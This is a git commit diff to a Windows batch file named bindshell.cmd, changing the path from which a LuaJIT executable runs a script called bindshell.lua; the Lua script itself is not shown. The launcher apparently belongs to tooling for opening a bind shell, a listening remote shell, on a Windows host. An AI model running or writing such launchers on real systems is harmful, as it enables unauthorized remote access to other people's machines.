a300b30d96b8b919747a817021b94b253957b1c1
invisibleghostshell-ux <invisibleghostshell@gmail.com>
2024-08-02 11:44:02 -0400

    Update bindshell.cmd

--- bindshell.cmd
+++ bindshell.cmd
@@ -1,3 +1,3 @@
 @echo off
 REM Execute the Lua script using the Lua executable
-"C:\Users\Public\Documents\Luapath\luajit.exe" "%TEMP%\bindshell.lua"
+"C:\Users\Public\Documents\Luapath\luajit.exe" "C:\Users\Public\Documents\bindshell.lua"
